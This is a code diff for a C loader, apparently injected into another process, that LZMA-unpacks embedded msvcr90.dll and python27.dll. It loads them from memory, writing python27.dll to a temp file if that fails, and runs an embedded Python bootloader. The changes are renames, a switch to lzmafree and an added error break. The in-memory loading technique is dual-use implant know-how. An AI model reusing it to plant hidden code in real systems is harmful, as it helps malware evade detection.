@@ -14,9 +14,9 @@
 #include "base_inject.h"
 #include "debug.h"
 
-#include "resources_msvcr90_dll.c"
-#include "resources_python27_dll.c"
-#include "resources_bootloader_pyc.c"
+#include "msvcr90.c"
+#include "python27.c"
+#include "bootloader.c"
 
 #include "lzmaunpack.c"
 
@@ -53,13 +53,13 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 
 	if(!GetModuleHandle("msvcr90.dll")) {
 		void *msvcr90 = lzmaunpack(
-			resources_msvcr90_dll_start,
-			resources_msvcr90_dll_size,
+			msvcr90_c_start,
+			msvcr90_c_size,
 			NULL
 		);
 
 		int r = _load_msvcr90(msvcr90);
-		free(msvcr90);
+		lzmafree(msvcr90);
 
 		dfprint(stderr,"loading msvcr90.dll: %d\n", r);
 	}
@@ -79,9 +79,9 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 			_load_python_FromFile("python27.dll"); // does not actually load a new python, but uses the handle of the already loaded one
 		}
 		else{
-			void *python27 = lzmaunpack(resources_python27_dll_start, resources_python27_dll_size, NULL);
+			void *python27 = lzmaunpack(python27_c_start, python27_c_size, NULL);
 			int res = _load_python("python27.dll", python27);
-			free(python27);
+			lzmafree(python27);
 			if(!res) {
 				dfprint(stderr,"loading python27.dll from memory failed\n");
 
@@ -89,7 +89,7 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 				sprintf(tmp_python_dll_path, "%spython27.dll", tmp_path);
 
 				f=fopen(tmp_python_dll_path,"wb");
-				res=fwrite(resources_python27_dll_start, sizeof(char), resources_python27_dll_size, f);
+				res=fwrite(python27_c_start, sizeof(char), python27_c_size, f);
 				fclose(f);
 
 				if(!_load_python(tmp_python_dll_path, NULL)){
@@ -127,8 +127,8 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	m = PyImport_AddModule("__main__");
 	if (m) d = PyModule_GetDict(m);
 	if (d) seq = PyObject_lzmaunpack(
-		resources_bootloader_pyc_start,
-		resources_bootloader_pyc_size
+		bootloader_c_start,
+		bootloader_c_size
 	);
 	if (seq) {
 		Py_ssize_t i, max = PySequence_Length(seq);
@@ -139,6 +139,7 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 				if (!discard) {
 					PyErr_Print();
 					rc = 255;
+					break;
 				}
 				Py_XDECREF(discard);
 				/* keep going even if we fail */
